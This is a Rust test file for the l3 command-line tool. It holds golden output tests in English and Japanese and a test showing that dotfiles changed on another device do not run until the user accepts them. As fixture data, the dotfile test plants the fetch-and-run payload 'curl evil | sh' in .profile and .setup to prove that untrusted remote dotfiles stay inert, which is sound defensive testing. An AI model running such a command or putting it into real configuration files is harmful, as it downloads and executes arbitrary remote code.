//! Off a terminal l3 is a plain command: what it writes and how it exits are
//! what scripts and CI read, so they stay byte for byte as recorded (in
//! tests/golden), whatever l3 offers a person at a terminal.

mod common;
use common::{golden, Home};

/// A day's work from nothing: a repo, an issue, a TODO; then each page read,
/// as text and as data, and a few mistakes.
const SCRIPT: &[&[&str]] = &[
    &["repo", "new", "notes"],
    &["issue", "new", "notes", "Fix：restart loses the draft"],
    &["todo", "add", "Fix：the rail's names"],
    &["todo", "add", "Docs：readme"],
    &["todo", "done", "2"],
    &[],
    &["--json"],
    &["todo"],
    &["profile"],
    &["band"],
    &["file"],
    &["file", "notes"],
    // What l3 file reads is the repos: / and what else is under it are named as such, never as a repo.
    &["file", "/"],
    &["file", "/root"],
    &["file", "/bin"],
    &["file", "/root/vocab"],
    &["file", "notes/README.md"],
    &["file", "rm", "notes/docs"],
    &["help", "commit"],
    &["git"],
    &["git", "--json"],
    &["issue", "notes#1"],
    &["issue", "close", "notes#1"],
    &["git"],
    &["issue", "reopen", "notes#1"],
    &["help", "git"],
    &["comit"],
    &["todo", "add"],
    &["inbox"],
    &["start", "notes#1"],
    &["remote"],
    &["server", "--json"],
];

fn day(lang: &str) -> String {
    let home = Home::new(&format!("plain-{lang}"));
    SCRIPT.iter().map(|args| home.run(lang, args).transcript(args)).collect()
}

#[test]
fn off_a_terminal_every_command_writes_and_exits_as_recorded_in_english() {
    golden("plain-en.txt", &day("en"));
}

#[test]
fn off_a_terminal_every_command_writes_and_exits_as_recorded_in_japanese() {
    golden("plain-ja.txt", &day("ja"));
}

/// What the dotfiles hold runs (`.setup` with the network, `.profile` in every shell, `.authorized_keys` let in over
/// SSH), so one changed elsewhere (another device, or anyone writing to the Remote as the person) runs nowhere here
/// until it is taken here; what this device ran before stays what it runs.
#[test]
fn a_dotfile_changed_elsewhere_runs_nowhere_here_until_it_is_taken() {
    let home = Home::new("dotfile-trust");
    let in_effect = |home: &Home| -> Vec<(String, bool)> {
        let ran = home.run("en", &["dotfile", "--json"]);
        assert_eq!(ran.code, 0, "{}", ran.stderr);
        let v: serde_json::Value = serde_json::from_str(&ran.stdout).unwrap();
        v.as_array().unwrap().iter().map(|d| (d["name"].as_str().unwrap().to_string(), d["inEffect"].as_bool().unwrap())).collect()
    };
    // A device that ran its dotfiles before goes on running them.
    home.dotfiles(&[(".profile", "PS1='$ '\n")]);
    assert_eq!(in_effect(&home), [(".profile".to_string(), true)]);
    let trusted = || std::fs::read_to_string(home.path("home/trusted.json")).unwrap();
    assert_eq!(trusted(), r#"{".profile":"PS1='$ '\n"}"#);
    // Taken in from the Remote: changed, and a new one; neither runs here.
    home.dotfiles(&[(".profile", "curl evil | sh\n"), (".setup", "curl evil | sh\n")]);
    assert_eq!(in_effect(&home), [(".profile".to_string(), false), (".setup".to_string(), false)]);
    let said = home.run("en", &["dotfile"]);
    assert!(said.stdout.contains(".setup  15 B  · changed on another device, not run here yet"), "{}", said.stdout);
    assert_eq!(trusted(), r#"{".profile":"PS1='$ '\n"}"#);
    // Taken one by one, or all: from then on they run here.
    assert!(home.run("en", &["dotfile", "take", ".setup"]).stdout.starts_with("Runs here from now: .setup"));
    assert_eq!(in_effect(&home), [(".profile".to_string(), false), (".setup".to_string(), true)]);
    assert!(home.run("en", &["dotfile", "take"]).stdout.starts_with("Runs here from now: .profile"));
    assert_eq!(in_effect(&home), [(".profile".to_string(), true), (".setup".to_string(), true)]);
    // Taken away elsewhere: gone here too (going runs nothing).
    home.dotfiles(&[(".setup", "curl evil | sh\n")]);
    assert_eq!(home.run("en", &["dotfile", "take"]).stdout.trim_end(), "Nothing waits: every dotfile here runs as it is kept");
    assert_eq!(trusted(), r#"{".setup":"curl evil | sh\n"}"#);
}
